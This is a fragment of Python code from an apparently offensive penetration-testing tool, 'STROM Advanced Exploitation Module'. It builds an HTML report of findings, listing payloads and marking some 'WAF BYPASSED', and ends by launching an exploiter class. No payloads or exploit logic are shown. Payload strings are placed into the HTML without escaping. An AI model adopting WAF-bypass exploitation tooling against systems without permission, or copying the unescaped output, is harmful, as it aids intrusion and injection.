        .stat {{ background: #f5f5f5; padding: 20px; text-align: center; border-radius: 5px; }}
        .critical {{ background: #ffebee; color: #c62828; }}
        .high {{ background: #fff3e0; color: #e65100; }}
        .medium {{ background: #e1f5fe; color: #01579b; }}
        .low {{ background: #e8f5e9; color: #2e7d32; }}
        .vuln {{ background: #f9f9f9; padding: 15px; margin: 15px 0; border-left: 4px solid #999; }}
        .vuln h3 {{ margin-top: 0; }}
        code {{ background: #f5f5f5; padding: 2px 6px; border-radius: 3px; font-family: monospace; }}
        .timestamp {{ color: #666; font-size: 0.9em; }}
        .bypass-badge {{ background: #4caf50; color: white; padding: 3px 8px; border-radius: 3px; font-size: 0.85em; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ”’ Penetration Test Report</h1>
        
        <div class="info">
            <strong>Target:</strong> {report['test_info'].get('target', 'N/A')}<br>
            <strong>Tester:</strong> {report['test_info'].get('tester', 'N/A')}<br>
            <strong>Authorization Code:</strong> {report['test_info'].get('authorization_code', 'N/A')}<br>
            <strong>Session ID:</strong> {report['test_info'].get('session_id', 'N/A')}<br>
            <strong>Test Date:</strong> {report['test_info'].get('timestamp', 'N/A')}
        </div>
        
        <h2>Executive Summary</h2>
        <div class="summary">
            <div class="stat critical">
                <h3>{report['summary']['critical']}</h3>
                <p>Critical</p>
            </div>
            <div class="stat high">
                <h3>{report['summary']['high']}</h3>
                <p>High</p>
            </div>
            <div class="stat medium">
                <h3>{report['summary']['medium']}</h3>
                <p>Medium</p>
            </div>
            <div class="stat low">
                <h3>{report['summary']['low']}</h3>
                <p>Low</p>
            </div>
        </div>
        
        <h2>Detailed Findings</h2>
"""
        
        for i, vuln in enumerate(report['vulnerabilities'], 1):
            severity = vuln.get('severity', 'UNKNOWN').lower()
            bypass_applied = vuln.get('bypass_applied', False)
            
            html_template += f"""
        <div class="vuln {severity}">
            <h3>Finding #{i}: {vuln.get('type', 'Unknown')} """
            
            if bypass_applied:
                html_template += '<span class="bypass-badge">WAF BYPASSED</span>'
            
            html_template += f"""</h3>
            <p><strong>Severity:</strong> {vuln.get('severity', 'N/A')}</p>
            <p><strong>URL:</strong> <code>{vuln.get('url', 'N/A')}</code></p>
            <p><strong>Technique:</strong> {vuln.get('technique', vuln.get('method', 'N/A'))}</p>
"""
            if 'payload' in vuln:
                html_template += f"            <p><strong>Payload:</strong> <code>{vuln['payload'][:100]}...</code></p>\n"
            
            if 'original_payload' in vuln and vuln.get('bypass_applied'):
                html_template += f"            <p><strong>Original Payload:</strong> <code>{vuln['original_payload'][:100]}...</code></p>\n"
            
            html_template += "        </div>\n"
        
        html_template += """
        <div class="timestamp">
            <p>Report generated: """ + report['timestamp'] + """</p>
            <p>Report generated by STROM Advanced Exploitation Module v2.0</p>
        </div>
    </div>
</body>
</html>
"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_template)

if __name__ == "__main__":
    exploiter = AdvancedExploiter()
    exploiter.run()
